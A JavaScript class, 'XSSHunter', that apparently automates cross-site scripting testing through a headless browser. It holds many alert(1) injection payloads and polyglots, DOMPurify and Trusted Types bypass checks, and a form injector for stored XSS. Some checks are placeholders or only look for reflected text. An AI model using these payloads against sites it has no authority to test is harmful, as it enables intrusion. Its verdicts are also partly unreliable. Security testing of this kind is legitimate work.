class XSSHunter {
  constructor(page) {
    this.page = page;
    this.findings = [];
  }

  contexts = {
    html: { payloads: ['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '<body onload=alert(1)>', '<input autofocus onfocus=alert(1)>', '<details open ontoggle=alert(1)>', '<select autofocus onfocus=alert(1)>'], escape: (s) => s.replace(/</g, '&lt;').replace(/>/g, '&gt;') },
    attribute: { payloads: ['" onfocus=alert(1) autofocus="', '" autofocus onfocus=alert(1)//', '" onfocus=alert(1) x="', "' onfocus=alert(1) autofocus='", '" onclick=alert(1)//', '" onmouseover=alert(1)//'], escape: (s) => s.replace(/"/g, '&quot;').replace(/'/g, '&#x27;') },
    url: { payloads: ['javascript:alert(1)', 'javascript:alert(1)//', 'JaVaScRiPt:alert(1)', 'java\nscript:alert(1)', 'javascript:alert(1);'], escape: (s) => encodeURI(s) },
    script: { payloads: ["';alert(1)//", '";alert(1)//', "';</script><script>alert(1)</script>", '\\";alert(1)//', "1;alert(1)"], escape: (s) => s.replace(/</g, '\\x3c').replace(/'/g, "\\'") },
    css: { payloads: ['expression(alert(1))', 'javascript:alert(1)', '-moz-binding:url("data:text/javascript;base64,alert(1)")'], escape: (s) => s.replace(/[{}();,!]/g, '') },
    angular: { payloads: ['{{constructor.constructor("alert(1)")()}}', '{{$on.constructor("alert(1)")()}}', '{{a="constructor";b="constructor";c=a[b];c("alert(1)")()}}'], escape: (s) => s.replace(/[{}()]/g, '') }
  };

  async testReflectedXSS(url, paramName, context = 'html') {
    const findings = [];
    const ctx = this.contexts[context];
    if (!ctx) return findings;
    for (const payload of ctx.payloads) {
      const testUrl = new URL(url);
      testUrl.searchParams.set(paramName, payload);
      try {
        await this.page.goto(testUrl.href, { waitUntil: 'domcontentloaded', timeout: 10000 });
        const body = await this.page.evaluate(() => document.body.innerHTML);
        if (body.includes(payload) || body.includes(payload.replace(/"/g, '&quot;'))) {
          findings.push({ url: testUrl.href, param: paramName, payload, reflected: true, context });
        }
      } catch {}
    }
    if (findings.length) this.findings.push({ type: 'reflected', param: paramName, count: findings.length, examples: findings.slice(0, 3) });
    return findings;
  }

  async testStoredXSS(formUrl, formFields, submitSelector, payload, successIndicator) {
    await this.page.goto(formUrl, { waitUntil: 'networkidle' });
    const targetField = formFields.find(f => f.inject);
    if (!targetField) return { error: 'No injectable field marked with inject:true' };
    await this.page.fill(targetField.selector, payload);
    for (const field of formFields.filter(f => !f.inject)) {
      if (field.value) await this.page.fill(field.selector, field.value);
    }
    await Promise.all([
      this.page.waitForNavigation({ waitUntil: 'networkidle', timeout: 15000 }).catch(() => {}),
      this.page.click(submitSelector)
    ]);
    if (successIndicator) {
      const storedUrl = typeof successIndicator === 'string' ? successIndicator : this.page.url();
      await this.page.goto(storedUrl, { waitUntil: 'networkidle' });
      const body = await this.page.evaluate(() => document.body.innerHTML);
      const executed = await this.page.evaluate((p) => document.body.innerHTML.includes(p), payload);
      this.findings.push({ type: 'stored', payload, stored: true, executed, url: storedUrl });
      return { stored: true, executed, payload };
    }
    return { stored: false, payload };
  }

  async detectDOMXSS() {
    const sinks = await this.page.evaluate(() => {
      const results = [];
      const scripts = document.querySelectorAll('script:not([src])');
      scripts.forEach(s => {
        const code = s.textContent;
        const domXssPatterns = [
          /innerHTML\s*=/g, /outerHTML\s*=/g, /document\.write\s*\(/g,
          /eval\s*\(/g, /setTimeout\s*\(/g, /setInterval\s*\(/g,
          /new\s+Function\s*\(/g, /\.html\s*\(/g, /\.append\s*\(/g,
          /\.prepend\s*\(/g, /\.after\s*\(/g, /\.before\s*\(/g,
          /\.replaceWith\s*\(/g, /\.insertAdjacentHTML\s*\(/g,
          /location\s*=/g, /location\.href\s*=/g, /location\.replace\s*\(/g,
          /location\.assign\s*\(/g, /srcdoc\s*=/g,
          /new\s+DOMParser/g, /createContextualFragment/g,
          /indexedDB/g, /postMessage/g, /importScripts/g
        ];
        for (const pattern of domXssPatterns) {
          const matches = code.match(pattern);
          if (matches) {
            const lines = code.split('\n');
            for (let i = 0; i < lines.length; i++) {
              if (pattern.test(lines[i])) {
                results.push({ sink: pattern.source, line: i + 1, code: lines[i].trim().slice(0, 150) });
              }
            }
          }
        }
      });
      return results;
    });
    if (sinks.length) this.findings.push({ type: 'dom-sink', count: sinks.length, details: sinks.slice(0, 10) });
    return sinks;
  }

  async testMutatedXSS(url) {
    const results = [];
    const mXSSPayloads = [
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
      '<div><svg><b><style><span class="</style><img src=x onerror=alert(1)>">',
      '<details open=x ontoggle=alert(1)><summary>x</summary></details>'
    ];
    for (const payload of mXSSPayloads) {
      const testUrl = new URL(url);
      testUrl.searchParams.set('q', payload);
      try {
        await this.page.goto(testUrl.href, { waitUntil: 'domcontentloaded', timeout: 10000 });
        const afterRender = await this.page.evaluate(() => document.body.innerHTML);
        const sanitized = afterRender.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
        if (sanitized.includes('<img src=x onerror=alert(1)>') || sanitized.includes('<svg onload=alert(1)>')) {
          results.push({ payload, mutated: true });
          this.findings.push({ type: 'mxss', payload, mutated: true, severity: 'HIGH' });
        }
      } catch {}
    }
    return results;
  }

  async detectCSP() {
    const csp = await this.page.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      if (meta) return { source: 'meta', value: meta.getAttribute('content') };
      return null;
    });
    const headers = await this.page.evaluate(() => 'CSP check — run via browser-automation interceptResponses');
    const findings = [];
    if (!csp) findings.push({ issue: 'No CSP meta tag found', severity: 'LOW' });
    else if (csp.value.includes("'unsafe-inline'")) findings.push({ issue: 'CSP allows unsafe-inline', severity: 'MEDIUM' });
    else if (csp.value.includes("'unsafe-eval'")) findings.push({ issue: 'CSP allows unsafe-eval', severity: 'MEDIUM' });
    return { csp, findings };
  }

  generatePolyglot() {
    return {
      basic: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>',
      htmlContext: '<img src=x onerror=alert(1)>',
      jsContext: "';alert(1);//",
      urlContext: 'javascript:alert(1)',
      attributeContext: '" autofocus onfocus=alert(1)//',
      angular: '{{constructor.constructor("alert(1)")()}}',
      template: '<template><script>alert(1)</script></template>',
      domClobber: '<a id="sanitized"><img src=x onerror=alert(1)></a>',
      mathMl: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
      svgPolyglot: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    };
  }

  async fullScan(url) {
    console.log('[XSSHunter] Running full scan...');
    const results = {
      domSinks: await this.detectDOMXSS(),
      csp: await this.detectCSP(),
      domXssCount: this.findings.filter(f => f.type === 'dom-sink').length
    };
    const domXssMitigations = await this.page.evaluate(() => {
      const hasTrustedTypes = typeof trustedTypes !== 'undefined';
      const hasSanitizer = typeof Sanitizer !== 'undefined';
      return { trustedTypes: hasTrustedTypes, sanitizerAPI: hasSanitizer };
    });
    results.mitigations = domXssMitigations;
    return results;
  }

  async testTrustedTypesBypass() {
    return this.page.evaluate(() => {
      const bypasses = [];
      if (typeof trustedTypes !== 'undefined') {
        try { const p = trustedTypes.createPolicy('foo', { createHTML: (s) => s }); bypasses.push({ type: 'createPolicy allowed', policy: 'foo' }); } catch {}
        try { const p = trustedTypes.defaultPolicy; if (p) bypasses.push({ type: 'defaultPolicy exists' }); } catch {}
      }
      return bypasses;
    });
  }

  async testDOMPurifyBypass() {
    return this.page.evaluate(() => {
      if (typeof DOMPurify === 'undefined') return { available: false };
      const bypasses = [];
      const payloads = ['<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', '<details open=x ontoggle=alert(1)>', '<svg><p><style><img src=x onerror=alert(1) onerror=alert(2)>'];
      for (const p of payloads) { const r = DOMPurify.sanitize(p); if (r.includes('onerror') || r.includes('alert')) bypasses.push({ payload: p.slice(0, 50), result: 'bypass' }); }
      return { available: true, bypasses };
    });
  }

  async testNestedContexts(url, param) {
    const findings = [];
    const nested = ['<svg onload=alert(1)><a href="javascript:alert(1)">x</a>', '""--><script>alert(1)</script>', '${alert(1)}', '{{constructor.constructor("alert(1)")()}}', '{%print(1)%}'];
    for (const payload of nested) {
      const testUrl = new URL(url); testUrl.searchParams.set(param, payload);
      try { await this.page.goto(testUrl.href, { waitUntil: 'domcontentloaded', timeout: 8000 }); if ((await this.page.evaluate(() => document.body.innerHTML)).includes('alert')) findings.push({ payload: payload.slice(0, 40), context: 'nested' }); } catch {}
    }
    if (findings.length) this.findings.push({ type: 'nested-context-xss', count: findings.length, severity: 'HIGH' });
    return findings;
  }

  async detectSelfXSS() {
    return this.page.evaluate(() => {
      const scripts = document.querySelectorAll('script');
      const results = [];
      scripts.forEach(s => {
        const code = s.textContent;
        if (code && (code.includes('console.log') || code.includes('prompt(')) && (code.includes('%s') || code.includes('${'))) results.push({ src: s.src || 'inline', snippet: code.slice(0, 150) });
      });
      return results;
    });
  }

  async testAnchorInjection() {
    return this.page.evaluate(() => {
      const results = [];
      document.querySelectorAll('a[href]').forEach(a => {
        const href = a.getAttribute('href');
        if (href && !href.startsWith('#') && !href.startsWith('/') && !href.startsWith('http')) {
          const decoded = decodeURIComponent(href);
          if (decoded.includes(':') || decoded.startsWith('//')) results.push({ href: href.slice(0, 100), text: a.textContent?.slice(0, 50) });
        }
      });
      return results;
    });
  }

  async testInlineEventHandlers() {
    return this.page.evaluate(() => {
      const results = [];
      const all = document.querySelectorAll('*');
      all.forEach(el => {
        for (let i = 0; i < el.attributes.length; i++) {
          const a = el.attributes[i];
          if (a.name.startsWith('on') && a.value.length > 5) results.push({ tag: el.tagName, attr: a.name, value: a.value.slice(0, 100) });
        }
      });
      return results.slice(0, 30);
    });
  }

  async testSVGXSS() {
    const svgPayloads = ['<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', '<svg xmlns="http://www.w3.org/2000/svg"><use href="data:image/svg+xml,<script>alert(1)</script>">', '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>'];
    const results = [];
    for (const p of svgPayloads) results.push({ payload: p.slice(0, 60), length: p.length });
    return results;
  }

  async testBaseTagInjection() {
    return this.page.evaluate(() => {
      const bases = document.querySelectorAll('base');
      return Array.from(bases).map(b => ({ href: b.href, target: b.target }));
    });
  }

  async testFormActionInjection() {
    return this.page.evaluate(() => {
      const results = [];
      document.querySelectorAll('form[action]').forEach(f => {
        const action = f.getAttribute('action');
        if (action && (action.startsWith('javascript:') || action === '' || action.startsWith('data:'))) results.push({ action: action.slice(0, 100), id: f.id });
      });
      return results;
    });
  }

  generateAllPolyglots() {
    return {
      html: '<img/src=x onerror=alert(1)>',
      svg: '<svg/onload=alert(1)>',
      body: '<body onload=alert(1)>',
      details: '<details/open/ontoggle=alert(1)>',
      select: '<select autofocus onfocus=alert(1)>',
      video: '<video><source onerror=alert(1)>',
      audio: '<audio src=x onerror=alert(1)>',
      input: '<input autofocus onfocus=alert(1)>',
      iframe: '<iframe srcdoc="<script>alert(1)</script>">',
      math: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
      link: '<link rel=stylesheet href=javascript:alert(1)>',
      meta: '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
      object: '<object data=javascript:alert(1)>',
      embed: '<embed src=javascript:alert(1)>',
      style: '<style onload=alert(1)>',
      table: '<table background=javascript:alert(1)>',
      td: '<td background=javascript:alert(1)>',
      division: '<div style="background:url(javascript:alert(1))">',
      expression: '<div style="width:expression(alert(1))">',
      keygen: '<keygen autofocus onfocus=alert(1)>'
    };
  }
}

module.exports = { XSSHunter };
